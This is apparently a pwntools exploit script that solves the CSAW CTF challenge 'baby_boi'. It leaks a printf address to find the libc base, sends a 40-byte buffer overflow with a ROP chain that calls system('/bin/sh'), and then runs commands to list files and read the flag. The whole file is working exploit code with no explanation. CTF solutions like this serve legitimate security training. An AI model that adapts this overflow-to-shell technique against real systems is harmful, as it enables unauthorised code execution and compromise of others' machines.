from pwn import *

r = remote("pwn.chal.csaw.io", 1005)#process("./baby_boi")#
printf_plt = 0x00400470
printf_off = 0x00064e80
system_off = 0x0004f440
bin_sh_off = 0x001b3e9a
one_shot = 0x4f2c5#0x10a38c#0x4f322
pop_rsi = 0x0000000000400641
pop_rdi = 0x0000000000400643
r.recvuntil("Here I am: ")
leak = r.recvuntil("\n").replace("\n","")
leak = int(leak,16)
libc_base = leak -printf_off
print "[+] libc_base at: " + hex(libc_base)
p = ""
p += "A"*40
p += p64(pop_rsi)
p += p64(0x0)
p += p64(0x0)
p += p64(pop_rdi)
p += p64(libc_base + bin_sh_off)
p += p64(libc_base + system_off)
p += "\x00"*300
r.sendline(p)
r.sendline("ls -al;cat flag.txt")
r.interactive()
